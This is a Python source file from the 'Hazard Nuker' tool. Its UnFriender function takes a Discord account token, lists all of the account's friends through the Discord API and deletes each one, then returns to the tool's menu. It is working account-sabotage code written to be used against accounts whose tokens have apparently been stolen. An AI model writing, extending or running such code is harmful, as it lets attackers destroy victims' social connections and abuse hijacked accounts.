# Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
# Hazard Nuker under the GNU General Public Liscense v2 (1991).

import requests
import json
import Hazard
from colorama import Fore

from util.plugins.common import print_slow, getheaders

def UnFriender(token):
    #get all friends
    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(token)).json()
    for friend in friendIds:
        try:
            #Delete all friends they have
            requests.delete(
                f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers=getheaders(token))
            print(f"{Fore.GREEN}Removed friend: {Fore.WHITE}"+friend['user']['username']+"#"+friend['user']['discriminator']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    print_slow(f"{Fore.LIGHTGREEN_EX}Successfully Removed all available friend! ")
    print("Enter anything to continue. . . ", end="")
    input()
    Hazard.main()